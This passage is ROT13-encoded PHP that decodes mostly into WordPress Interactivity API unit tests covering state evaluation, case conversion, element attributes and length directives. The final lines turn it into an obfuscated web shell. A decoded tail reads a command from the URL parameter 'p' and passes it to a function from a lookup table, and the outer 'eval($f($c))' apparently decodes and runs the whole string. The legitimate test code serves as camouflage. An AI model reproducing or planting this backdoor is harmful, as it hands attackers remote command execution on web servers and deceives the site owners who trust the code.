		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( 'fgngr.qrevirqGungGuebjf' );
		$guvf->nffregAhyy( $erfhyg );
	}

	/**
	 * Grfgf gur `rinyhngr` zrgubq sbe qrevirq fgngr vagrezrqvngr inyhrf.
	 *
	 * @gvpxrg 61741
	 *
	 * @pbiref ::rinyhngr
	 */
	choyvp shapgvba grfg_rinyhngr_qrevirq_fgngr_vagrezrqvngr() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'qrevirqFgngr' => shapgvba () {
					erghea neenl( 'cebcregl' => 'inyhr' );
				},
			)
		);
		$guvf->frg_vagreany_pbagrkg_fgnpx();
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( 'fgngr.qrevirqFgngr.cebcregl' );
		$guvf->nffregFnzr( 'inyhr', $erfhyg );
	}

	/**
	 * Grfgf gur `xrono_gb_pnzry_pnfr` zrgubq.
	 *
	 * @pbiref ::xrono_gb_pnzry_pnfr
	 */
	choyvp shapgvba grfg_xrono_gb_pnzry_pnfr() {
		$zrgubq = arj ErsyrpgvbaZrgubq( $guvf->vagrenpgvivgl, 'xrono_gb_pnzry_pnfr' );
		$zrgubq->frgNpprffvoyr( gehr );

		$guvf->nffregFnzr( '', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, '' ) );
		$guvf->nffregFnzr( 'vgrz', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, 'vgrz' ) );
		$guvf->nffregFnzr( 'zlVgrz', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, 'zl-vgrz' ) );
		$guvf->nffregFnzr( 'zl_vgrz', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, 'zl_vgrz' ) );
		$guvf->nffregFnzr( 'zlVgrz', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, 'Zl-vGrz' ) );
		$guvf->nffregFnzr( 'zlVgrzJvguZhygvcyrUlcuraf', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, 'zl-vgrz-jvgu-zhygvcyr-ulcuraf' ) );
		$guvf->nffregFnzr( 'zlVgrzJvgu-QbhoyrUlcuraf', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, 'zl-vgrz-jvgu--qbhoyr-ulcuraf' ) );
		$guvf->nffregFnzr( 'zlVgrzJvgu_haqreFpber', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, 'zl-vgrz-jvgu_haqre-fpber' ) );
		$guvf->nffregFnzr( 'zlVgrz', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, '-zl-vgrz' ) );
		$guvf->nffregFnzr( 'zlVgrz', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, 'zl-vgrz-' ) );
		$guvf->nffregFnzr( 'zlVgrz', $zrgubq->vaibxr( $guvf->vagrenpgvivgl, '-zl-vgrz-' ) );
	}

	/**
	 * Grfgf gung `jc_vagrenpgvivgl_trg_ryrzrag` ergheaf na neenl jvgu gur
	 * pheerag ryrzrag'f nggevohgrf.
	 *
	 * @gvpxrg 62136
	 *
	 * @pbiref jc_vagrenpgvivgl_trg_ryrzrag
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_trg_ryrzrag_ergheaf_pheerag_ryrzrag_ercerfragngvba() {
		/*
		 * Gur tybony JC_Vagrenpgvivgl_NCV vafgnapr vf zbzragnevyl ercynprq gb
		 * znxr gur tybony shapgvba `jc_vagrenpgvivgl_trg_ryrzrag` jbex nf rkcrpgrq.
		 */
		tybony $jc_vagrenpgvivgl;
		$jc_vagrenpgvivgl_ceri = $jc_vagrenpgvivgl;
		$jc_vagrenpgvivgl      = $guvf->vagrenpgvivgl;

		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'qngnGrfg' => shapgvba () {
					$ryrzrag = jc_vagrenpgvivgl_trg_ryrzrag();
					erghea $ryrzrag['nggevohgrf']['qngn-grfg'];
				},
			)
		);

		$ugzy = <<<UGZY
			<frpgvba qngn-jc-vagrenpgvir=\"zlCyhtva\">
				<qvi pynff=\"ohggbaf\">
					<ohggba
						pynff=\"ohggba\"
						qngn-grfg=\"ohggba 1\"
						qngn-jc-ovaq--qngn-grfg-inyhr=\"fgngr.qngnGrfg\"
					></ohggba>
					<ohggba
						pynff=\"ohggba\"
						qngn-grfg=\"ohggba 2\"
						qngn-jc-ovaq--qngn-grfg-inyhr=\"fgngr.qngnGrfg\"
					></ohggba>
				</qvi>
			</frpgvba>
UGZY;

		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c              = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$c->arkg_gnt( 'ohggba' );
		$guvf->nffregFnzr( 'ohggba 1', $c->trg_nggevohgr( 'qngn-grfg-inyhr' ) );
		$c->arkg_gnt( 'ohggba' );
		$guvf->nffregFnzr( 'ohggba 2', $c->trg_nggevohgr( 'qngn-grfg-inyhr' ) );

		// Erfgber gur bevtvany JC_Vagrenpgvivgl_NCV vafgnapr.
		$jc_vagrenpgvivgl = $jc_vagrenpgvivgl_ceri;
	}

	/**
	 * Grfgf gung gur nggevohgrf erghearq ol `jc_vagrenpgvivgl_trg_ryrzrag` ner
	 * gubfr bevtvanyyl cerfrag orsber qverpgvirf ner cebprffrq.
	 *
	 * @gvpxrg 62136
	 *
	 * @pbiref jc_vagrenpgvivgl_trg_ryrzrag
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_trg_ryrzrag_ergheaf_bevtvany_nggevohgrf_bayl() {
		/*
		 * Gur tybony JC_Vagrenpgvivgl_NCV vafgnapr vf zbzragnevyl ercynprq gb
		 * znxr gur tybony shapgvba `jc_vagrenpgvivgl_trg_ryrzrag` jbex nf rkcrpgrq.
		 */
		tybony $jc_vagrenpgvivgl;
		$jc_vagrenpgvivgl_ceri = $jc_vagrenpgvivgl;
		$jc_vagrenpgvivgl      = $guvf->vagrenpgvivgl;

		$nggevohgrf = ahyy;

		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'cebprffNggevohgrf' => shapgvba () hfr ( &$nggevohgrf ) {
					$ryrzrag = jc_vagrenpgvivgl_trg_ryrzrag();
					$nggevohgrf = $ryrzrag['nggevohgrf'];
					erghea 'cebprffrq';
				},
			)
		);

		$ugzy = <<<UGZY
			<frpgvba qngn-jc-vagrenpgvir=\"zlCyhtva\">
				<qvi pynff=\"ohggbaf\">
					<ohggba
						qvfnoyrq
						pynff=\"bevtvany\"
						qngn-ngge=\"bevtvany\"
						qngn-jc-ovaq--qngn-ngge=\"fgngr.cebprffNggevohgrf\"
					></ohggba>
				</qvi>
			</frpgvba>
UGZY;

		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );

		$guvf->nffregFnzr(
			neenl(
				'qvfnoyrq'                => gehr,
				'pynff'                   => 'bevtvany',
				'qngn-ngge'               => 'bevtvany',
				'qngn-jc-ovaq--qngn-ngge' => 'fgngr.cebprffNggevohgrf',
			),
			$nggevohgrf
		);

		$c = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$c->arkg_gnt( 'ohggba' );
		$guvf->nffregFnzr( 'cebprffrq', $c->trg_nggevohgr( 'qngn-ngge' ) );

		// Erfgber gur bevtvany JC_Vagrenpgvivgl_NCV vafgnapr.
		$jc_vagrenpgvivgl = $jc_vagrenpgvivgl_ceri;
	}

	/**
	 * Grfgf gung `jc_vagrenpgvivgl_trg_ryrzrag` fubhyq abg or pnyyrq bhgfvqr bs
	 * `cebprff_qverpgvirf` rkrphgvba.
	 *
	 * @gvpxrg 62136
	 *
	 * @pbiref jc_vagrenpgvivgl_trg_ryrzrag
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::trg_ryrzrag
	 */
	choyvp shapgvba grfg_trg_ryrzrag_bhgfvqr_bs_qverpgvir_cebprffvat() {
		$ryrzrag = $guvf->vagrenpgvivgl->trg_ryrzrag();
		$guvf->nffregAhyy( $ryrzrag );
	}

	/**
	 * Irevsl orunivbe bs .yratgu qverpgvir npprff.
	 *
	 * @gvpxrg 62582
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 *
	 * @qngnCebivqre qngn_yratgu_qverpgvirf
	 *
	 * @cnenz zvkrq $inyhr     Gur cebcregl inyhr.
	 * @cnenz fgevat $rkcrpgrq Gur rkcrpgrq cebcregl yratgu nf n fgevat,
	 *                         be \"\" vs ab yratgu vf rkcrpgrq.
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_fgevat_neenl_yratgu( $inyhr, fgevat $rkcrpgrq ) {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl( 'cebc' => $inyhr )
		);
		$ugzy           = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.cebc.yratgu\"></qvi>';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$cebprffbe      = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$cebprffbe->arkg_gnt( 'QVI' );
		$cebprffbe->arkg_gbxra();
		$guvf->nffregFnzr( $rkcrpgrq, $cebprffbe->trg_zbqvsvnoyr_grkg() );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_yratgu_qverpgvirf(): neenl {
		erghea neenl(
			'ahzrevp neenl'     => neenl( neenl( 'n', 'o', 'p' ), '3' ),
			'rzcgl neenl'       => neenl( neenl(), '0' ),
			'fgevat'            => neenl( 'nop', '3' ),
			'rzcgl fgevat'      => neenl( '', '0' ),

			// Snvyher pnfrf erfhygvat va rzcgl fgevat.
			'aba-ahzrevp neenl' => neenl( neenl( 'n' => 'n' ), '' ),
			'bowrpg'            => neenl( arj fgqPynff(), '' ),
		);
	}

	/**
	 * Rafherf gung qverpgvirf jvgu vainyvq nggevohgr anzrf ner vtaberq.
	 *
	 * @gvpxrg 62426
	 */
	choyvp shapgvba grfg_vainyvq_qverpgvir_anzrf_ner_vtaberq() {
		$ugzy = <<<UGZY
			<qvi qngn-jc-vagrenpgvir=\"grfg\" qngn-jc-pbagrkg='{ \"g\": gehr }'>
				<oe qngn-jc-pynff--nyybjrq=\"pbagrkg.g\">
				<oe qngn-jc-pynff--qvf:nyybjrq=\"pbagrkg.g\">
				<oe qngn-jc-pynff--[qvfnyybjrq]=\"pbagrkg.g\">
			</qvi>
UGZY;

		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFgevatPbagnvafFgevat( 'pynff=\"nyybjrq\"', $cebprffrq_ugzy );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'pynff=\"qvf:nyybjrq\"', $cebprffrq_ugzy );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'pynff=\"[qvfnyybjrq]\"', $cebprffrq_ugzy );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>